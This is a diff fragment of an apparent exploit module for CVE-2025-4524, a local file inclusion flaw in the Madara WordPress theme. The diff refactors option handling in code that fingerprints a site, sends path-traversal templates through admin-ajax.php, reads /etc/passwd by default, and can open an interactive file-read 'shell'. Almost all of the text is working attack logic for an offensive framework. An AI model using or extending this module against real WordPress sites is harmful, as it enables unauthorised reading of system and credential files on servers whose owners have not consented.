@@ -123,29 +123,16 @@ class Module(Auxiliary, Http_client, Lfi):
     )
 
     def _get_ajax_path(self) -> str:
-        ajax = self.ajax_path.value if self.ajax_path.value else "/wp-admin/admin-ajax.php"
+        ajax = self.ajax_path if self.ajax_path else "/wp-admin/admin-ajax.php"
         if not ajax.startswith("/"):
             ajax = "/" + ajax
         return ajax
 
-    def _get_bool(self, opt, default=True):
-        if not hasattr(opt, "value"):
-            return default
-        v = opt.value
-        if isinstance(v, str):
-            return v.lower() in ("true", "yes", "1", "on")
-        return bool(v)
-
-    def _shell_lfi_enabled(self) -> bool:
-        return self._get_bool(self.shell_lfi, False)
-
     def _truncate_response(self, body: str) -> str:
-        lim = 65536
-        if hasattr(self, "max_output") and self.max_output.value is not None:
-            try:
-                lim = int(self.max_output.value)
-            except (TypeError, ValueError):
-                lim = 65536
+        try:
+            lim = int(self.max_output)
+        except (TypeError, ValueError):
+            lim = 65536
         if lim == 0:
             return body
         if len(body) > lim:
@@ -160,16 +147,14 @@ class Module(Auxiliary, Http_client, Lfi):
             return ""
         path = str(path).strip()
         ajax = self._get_ajax_path()
-        override = (self.template_override.value or "").strip() if hasattr(self, "template_override") else ""
-        if override and not self._shell_lfi_enabled():
+        override = (self.template_override or "").strip()
+        if override and not self.shell_lfi:
             template = override
         else:
-            depth = 7
-            if hasattr(self, "traversal_depth") and self.traversal_depth.value is not None:
-                try:
-                    depth = int(self.traversal_depth.value)
-                except (TypeError, ValueError):
-                    depth = 7
+            try:
+                depth = int(self.traversal_depth)
+            except (TypeError, ValueError):
+                depth = 7
             template = _build_template_from_remote_path(path, depth)
 
         payload = _madara_ajax_form(template)
@@ -185,12 +170,10 @@ class Module(Auxiliary, Http_client, Lfi):
             return ""
         body = r.text or ""
         out = self._truncate_response(body)
-        mo = 65536
-        if hasattr(self, "max_output") and self.max_output.value is not None:
-            try:
-                mo = int(self.max_output.value)
-            except (TypeError, ValueError):
-                mo = 65536
+        try:
+            mo = int(self.max_output)
+        except (TypeError, ValueError):
+            mo = 65536
         if mo > 0 and len(body) > mo:
             print_warning(f"Truncated execute() output to {mo} chars (max_output)")
         return out
@@ -199,7 +182,7 @@ class Module(Auxiliary, Http_client, Lfi):
         """Same detection logic as scanner/http/wordpress_madara_cve_2025_4524 (GET / fingerprint + POST /etc/passwd)."""
         try:
             ajax = self._get_ajax_path()
-            if self._get_bool(self.fingerprint, True):
+            if self.fingerprint:
                 home = self.http_request(method="GET", path="/", allow_redirects=True)
                 if not home:
                     return {"vulnerable": False, "reason": "No response on GET /", "confidence": "low"}
@@ -246,8 +229,8 @@ class Module(Auxiliary, Http_client, Lfi):
     def run(self):
         print_info(f"Target: {self.target}:{self.port} — CVE-2025-4524 Madara LFI")
 
-        verify_first = self._get_bool(self.verify_first, False)
-        fp = self._get_bool(self.fingerprint, True)
+        verify_first = self.verify_first
+        fp = self.fingerprint
         skip_fp = False
 
         if verify_first:
@@ -265,10 +248,10 @@ class Module(Auxiliary, Http_client, Lfi):
                 print_error("Madara fingerprint not found on GET / (set fingerprint false to skip)")
                 return False
 
-        if self._shell_lfi_enabled():
+        if self.shell_lfi:
             print_status("Starting LFI handler (lib.protocols.http.lfi — shell_lfi true)")
         else:
-            fr = self.file_read.value if hasattr(self.file_read, "value") and self.file_read.value else "/etc/passwd"
+            fr = self.file_read or "/etc/passwd"
             print_info(f"Single read via Lfi.handler_lfi (file_read={fr}); set shell_lfi true for interactive shell")
 
         self.handler_lfi()
